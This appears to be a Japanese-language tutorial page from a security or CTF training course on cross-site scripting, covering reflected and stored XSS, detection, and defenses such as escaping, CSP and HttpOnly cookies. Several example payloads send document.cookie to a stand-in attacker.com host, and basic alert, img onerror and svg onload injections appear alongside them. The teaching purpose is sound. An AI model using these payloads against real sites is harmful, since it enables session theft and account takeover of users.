@@ -1,0 +1,190 @@
+---
+sidebar_position: 3
+---
+
+# XSS（Cross-Site Scripting）
+
+## 前回の振り返り
+
+前回の演習では、`sqlite_master`からテーブル情報を取得するSQL Injectionを学びました。今回は、他のユーザーのブラウザでスクリプトを実行させるXSSを学びます。
+
+SQL Injectionが**サーバー側のデータベース**を攻撃するのに対し、XSSは**クライアント側のブラウザ**を攻撃します。
+
+## 今回の目標
+
+1. **XSS**の仕組みと危険性を理解する
+2. **反射型XSS**と**保存型XSS**の違いを理解する
+3. **フィルターバイパス**の手法を学ぶ
+
+## XSSとは
+
+**XSS（Cross-Site Scripting）** は、Webアプリケーションへの攻撃手法の一つです。入力欄に不正なスクリプトを注入し、他のユーザーのブラウザで実行させます。
+
+略称がCSS（Cascading Style Sheets）と紛らわしいため、XSSと呼ばれます。
+
+### 前提条件
+
+この攻撃が成立するには：
+- ユーザー入力がHTMLとしてレンダリングされる
+- 入力が適切にエスケープされていない
+- CSP（Content Security Policy）が設定されていない、または不十分
+
+### 攻撃成功時の例
+
+```html
+<!-- 注入されたスクリプト -->
+<script>
+  document.location = 'https://attacker.com/steal?cookie=' + document.cookie;
+</script>
+```
+
+被害者のブラウザでスクリプトが実行され、Cookieが攻撃者のサーバーに送信される。
+
+### 攻撃失敗時の例
+
+- CSP違反エラー（ブラウザのコンソールに表示）
+- スクリプトがエスケープされて表示される（`&lt;script&gt;` 等）
+
+### 成功/失敗の判定基準
+
+- **成功**: `alert()` が実行される、Cookieが窃取される
+- **失敗**: スクリプトがエスケープされる、CSPでブロックされる
+
+### 検出方法（防御側）
+
+- CSP違反レポートの監視
+- WAFによるXSSパターンの検出
+- ユーザーからの報告
+- 自動スキャンツール（OWASP ZAP等）
+
+## なぜ危険なのか
+
+XSSが成功すると、攻撃者は被害者のブラウザで任意のJavaScriptを実行できます。
+
+```
+XSS成功 → 被害者のCookieを窃取 → アカウント乗っ取り
+```
+
+## XSSの種類
+
+### 1. 反射型XSS（Reflected XSS）
+
+URLパラメータやフォームの入力値が、そのままページに反映される場合に発生します。
+
+#### 脆弱なコード（擬似コード）
+
+```
+# 検索結果ページ
+query = URLパラメータの "query"
+出力: "検索結果: " + query
+```
+
+#### 攻撃例
+
+```
+https://target.com/search?query=<script>alert('XSS')</script>
+```
+
+### 2. 保存型XSS（Stored XSS）
+
+入力値がデータベースに保存され、他のユーザーが表示するページで実行される場合に発生します。
+
+**反射型よりも危険**です。
+
+#### 攻撃例
+
+掲示板の投稿にスクリプトを埋め込む：
+
+```html
+<script>
+  // 閲覧者のCookieを攻撃者のサーバーに送信
+  new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
+</script>
+```
+
+この投稿を見た他のユーザーのブラウザでスクリプトが実行されます。
+
+## 実践: XSS
+
+### 基本的なペイロード
+
+```html
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+```
+
+### Cookieの窃取
+
+```html
+<script>
+  new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
+</script>
+```
+
+## よくある脆弱性パターン
+
+### 検索結果の表示
+
+```
+# 擬似コード
+# 悪い例: 入力をそのまま出力
+出力: "検索結果: " + ユーザーの入力
+
+# 良い例: エスケープして出力
+出力: "検索結果: " + エスケープ(ユーザーの入力)
+```
+
+### 掲示板・コメント
+
+```
+# 擬似コード
+# 悪い例
+出力: コメントの内容
+
+# 良い例
+出力: エスケープ(コメントの内容)
+```
+
+## 防御方法
+
+### 出力のエスケープ
+
+HTMLの特殊文字をエスケープすることで、スクリプトとして解釈されなくなります。
+
+| 文字 | エスケープ後 |
+|---|---|
+| `<` | `&lt;` |
+| `>` | `&gt;` |
+| `"` | `&quot;` |
+| `'` | `&#x27;` |
+
+### Content Security Policy（CSP）
+
+```
+Content-Security-Policy: default-src 'self'
+```
+
+ブラウザに対して、「このサイト自身のスクリプト以外は実行しないで」と指示します。
+
+### HttpOnly Cookie
+
+```
+Set-Cookie: session=abc123; HttpOnly
+```
+
+JavaScriptからのCookieアクセスを禁止します。XSSでCookieを窃取されても安全です。
+
+## CTFでのポイント
+
+1. **入力欄を全て試す**: 検索欄、フォーム、URLパラメータ
+2. **様々なペイロードを試す**: `<script>`, `<img>`, `<svg>`
+3. **Cookieの確認**: `document.cookie` でflagが取得できるか
+
+## まとめ
+
+XSSは、他のユーザーのブラウザで任意のスクリプトを実行させる攻撃手法です。
+
+出力のエスケープとCSPの設定で防御可能です。
+
+次は、同じクライアント側の脆弱性である**CSRF（Cross-Site Request Forgery）**について学びます。XSSがスクリプトを実行させるのに対し、CSRFはユーザーの意図しないリクエストを送信させます。
